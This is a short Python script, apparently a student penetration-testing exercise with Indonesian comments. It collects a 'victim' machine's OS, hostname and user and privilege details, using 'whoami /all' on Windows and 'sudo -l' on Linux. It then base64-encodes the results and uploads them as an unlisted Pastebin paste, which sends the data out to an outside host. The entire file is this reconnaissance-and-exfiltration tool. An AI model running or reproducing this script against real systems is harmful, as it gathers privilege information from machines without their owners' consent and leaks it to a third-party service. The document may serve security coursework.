# Juan Matthew - 2301852253
    
from platform import system, platform
import requests
import base64
import sys
from subprocess import PIPE, Popen

# Deklarasi URL Pastebin dan Developer API Key 
API_URL = "https://pastebin.com/api/api_post.php"
API_KEY = "<DEVELOPER_API_KEY>"

# Mengambil OS, Hostname ,user, group, dan privileges yang digunakan oleh victim
result_recon = "Results\n---------------\n"
# OS yang digunakan 
result_recon += f"Victim's OS: {platform()}\n\n"

if system() == "Windows":
    # Hostname
    process = Popen("hostname", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()

    # user, group, dan privileges
    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    
elif system() == "Linux":
    # Hostname
    process = Popen("hostname", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    
    # user, group, dan privileges
    process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate()

print(result_recon)
print(result)

# Mengecek apakah result kosong atau tidak
if result == b'':
    result_recon += error.decode()
    sys.exit(0)
else:
    result_recon += result.decode()

# Melakukan encode Base64 kepada result
result_recon = base64.b64encode(result_recon.encode())
print("\n Hasil Base64 Encode\n")
print(result_recon)
print("\n")

# Body Request yang akan dikirimkan ke API Endpoint
data = {
    'api_dev_key': API_KEY, # memasukan API key Developer
    'api_option': 'paste', # set Paste untuk memasukan data baru ke dalam pastebin
    'api_paste_private': 1, # set pastebin ke dalam unlisted
    'api_paste_name' : "ProgPentest_Pastebin", # nama pastebin yang digunakan
    'api_paste_code': result_recon # memasukan message ke dalam pastebin
}

# Mengirimkan request menggunakan method POST dan menampilkan link pastebin
resp = requests.post(url=API_URL, data=data)
pastebin_url = resp.text
# jika upload gagal
if resp.status_code != 200:
    print(f"Response Code :{resp.status_code}")
    print("[!] Create Paste Failed")
    print(f"[!] Error: {resp.text}")
# jika upload berhasil
else:
    print(f"Response Code :{resp.status_code}")
    print("[*] Create Paste Success")
    print(f"[*] Pastebin URL: {resp.text}")